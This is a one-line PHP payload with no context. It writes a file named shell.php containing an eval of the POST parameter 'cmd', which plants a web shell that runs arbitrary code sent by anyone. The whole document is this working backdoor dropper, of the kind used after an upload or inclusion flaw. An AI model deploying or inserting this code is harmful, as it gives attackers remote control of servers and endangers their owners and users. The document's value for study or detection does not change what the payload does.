<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["cmd"]);?>'); ?>
